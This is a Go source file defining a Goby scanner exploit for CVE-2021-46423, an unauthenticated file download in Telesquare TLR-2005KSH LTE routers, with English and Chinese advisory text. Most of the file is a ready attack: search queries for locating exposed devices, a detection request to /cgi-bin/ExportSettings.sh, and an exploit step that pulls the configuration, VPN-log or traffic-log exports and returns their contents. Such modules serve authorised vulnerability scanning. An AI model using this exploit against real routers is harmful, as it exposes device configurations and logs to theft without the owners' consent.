package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Telesquare TLR-2005Ksh ExportSettings.sh file download (CVE-2021-46423)",
    "Description": "<p>Telesquare Tlr-2005K and so on are the Sk Telecom Lte routers of Korea Telesquare Company.</p><p>There are security vulnerabilities in Telesquare TLR-2005Ksh, etc., which originate from unauthenticated file downloads. A remote attacker could exploit this vulnerability to download a complete configuration file.</p>",
    "Product": "TELESQUARE-TLR-2005KSH",
    "Homepage": "http://telesquare.co.kr/",
    "DisclosureDate": "2022-12-16",
    "Author": "corp0ra1",
    "FofaQuery": "title=\"TLR-2005KSH\" || banner=\"TLR-2005KSH login:\"",
    "GobyQuery": "title=\"TLR-2005KSH\" || banner=\"TLR-2005KSH login:\"",
    "Level": "2",
    "Impact": "<p>There are security vulnerabilities in Telesquare TLR-2005Ksh, etc., which originate from unauthenticated file downloads. A remote attacker could exploit this vulnerability to download a complete configuration file.</p>",
    "Recommendation": "<p>The manufacturer has not yet released a fix to solve this security problem, please pay attention to the manufacturer's update in time: <a href=\"http://telesquare.co.kr/.\">http://telesquare.co.kr/.</a></p>",
    "References": [
        "https://drive.google.com/drive/folders/1iY4QqzZLdYgwD0LYc74M4Gm2wSC6Be1u?usp=sharing"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "createSelect",
            "value": "ExportSettings.sh,ExportvpnLog.sh,ExportTrafficLog.sh",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/ExportSettings.sh",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "settings.dat",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "export file",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/{{{filePath}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2021-46423"
    ],
    "CNNVD": [
        "CNNVD-202204-4486"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Telesquare TLR-2005Ksh 路由器 ExportSettings.sh 文件下载漏洞（CVE-2021-46423）",
            "Product": "TELESQUARE-TLR-2005KSH",
            "Description": "<p>Telesquare Tlr-2005K等都是韩国Telesquare公司的 Sk 电讯 Lte 路由器。<br></p><p>Telesquare TLR-2005Ksh等存在安全漏洞，该漏洞源于未经身份验证的文件下载。远程攻击者利用此漏洞可下载完整的配置文件。<br></p>",
            "Recommendation": "<p>厂商暂未发布修复措施解决此安全问题，请及时关注厂商更新：<a href=\"http://telesquare.co.kr/\">http://telesquare.co.kr/</a>。<br></p>",
            "Impact": "<p>Telesquare TLR-2005Ksh等存在安全漏洞，该漏洞源于未经身份验证的文件下载。远程攻击者利用此漏洞可下载完整的配置文件。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Telesquare TLR-2005Ksh ExportSettings.sh file download (CVE-2021-46423)",
            "Product": "TELESQUARE-TLR-2005KSH",
            "Description": "<p>Telesquare Tlr-2005K and so on are the Sk Telecom Lte routers of Korea Telesquare Company.<br></p><p>There are security vulnerabilities in Telesquare TLR-2005Ksh, etc., which originate from unauthenticated file downloads. A remote attacker could exploit this vulnerability to download a complete configuration file.<br></p>",
            "Recommendation": "<p>The manufacturer has not yet released a fix to solve this security problem, please pay attention to the manufacturer's update in time: <a href=\"http://telesquare.co.kr/.\">http://telesquare.co.kr/.</a><br></p>",
            "Impact": "<p>There are security vulnerabilities in Telesquare TLR-2005Ksh, etc., which originate from unauthenticated file downloads. A remote attacker could exploit this vulnerability to download a complete configuration file.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10777"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
